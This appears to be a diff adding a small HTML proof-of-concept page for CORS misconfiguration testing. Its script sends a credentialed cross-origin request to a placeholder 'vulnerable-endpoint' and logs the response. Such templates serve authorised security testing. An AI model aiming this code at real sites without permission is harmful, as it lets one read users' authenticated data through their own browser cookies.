@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS PoC</title>
+</head>
+<body>
+
+<script>
+    // Replace the URL with the target endpoint that has CORS misconfiguration
+    const targetUrl = 'https://example.com/vulnerable-endpoint';
+
+    // Replace this with the payload you want to send
+    const payload = { key: 'value' };
+
+    // Make a cross-origin request using Fetch API
+    fetch(targetUrl, {
+        method: 'POST', // or 'GET', 'PUT', etc. depending on the endpoint
+        headers: {
+            'Content-Type': 'application/json',
+            // Add any other necessary headers based on the target
+        },
+        mode: 'cors', // Set the CORS mode to 'cors'
+        credentials: 'include', // Include credentials if needed (cookies)
+        body: JSON.stringify(payload),
+    })
+    .then(response => response.json())
+    .then(data => {
+        // Handle the response data as needed
+        console.log('Response:', data);
+    })
+    .catch(error => {
+        // Handle errors
+        console.error('Error:', error);
+    });
+</script>
+
+</body>
+</html>
+
